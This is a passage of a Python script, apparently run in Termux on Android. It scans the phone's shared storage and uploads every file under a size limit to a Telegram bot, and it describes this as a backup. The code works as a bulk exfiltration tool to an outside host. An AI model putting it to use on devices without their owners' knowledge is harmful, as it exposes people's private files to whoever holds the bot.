def check_permissions():
    """Checks if the script has access to the phone storage."""
    print("[*] Checking storage permissions...")
    if not os.path.exists(TARGET_DIR):
        print("[!] ERROR: Storage access not found.")
        print("[*] Please run 'termux-setup-storage' in Termux and grant permission.")
        return False
    print("[+] Storage access granted.")
    return True

def send_file(file_path):
    """Sends a file to the Telegram Bot via API."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    file_name = os.path.basename(file_path)
    
    try:
        with open(file_path, 'rb') as f:
            payload = {'chat_id': CHAT_ID}
            files = {'document': f}
            response = requests.post(url, data=payload, files=files, timeout=30)
            
            if response.status_code == 200:
                print(f"[SUCCESS] Sent: {file_name}")
            else:
                print(f"[FAILED] Could not send {file_name}. Server responded: {response.text}")
    except Exception as e:
        print(f"[ERROR] An error occurred while sending {file_name}: {e}")

def run_backup():
    """Scans the storage and processes files."""
    print(f"[*] Scanning {TARGET_DIR} for files under {MAX_SIZE_MB}MB...")
    
    # List of system/temp folders to skip to save time and data
    exclude_folders = ['Android', '.thumbnails', 'cache', 'temp']

    for root, dirs, files in os.walk(TARGET_DIR):
        # Modify dirs in-place to skip excluded folders
        dirs[:] = [d for d in dirs if d not in exclude_folders]
        
        for file in files:
            file_path = os.path.join(root, file)
            try:
                file_size = os.path.getsize(file_path)
                
                # Only send files that are > 0 bytes and < 50 MB
                if 0 < file_size < MAX_SIZE_BYTES:
                    print(f"[*] Uploading: {file} ({file_size / (1024*1024):.2f} MB)")
                    send_file(file_path)
                    
                    # Short delay to avoid hitting Telegram's rate limit (Anti-spam)
                    time.sleep(2) 
            except (PermissionError, OSError):
                # Skip files that are locked or inaccessible
                continue

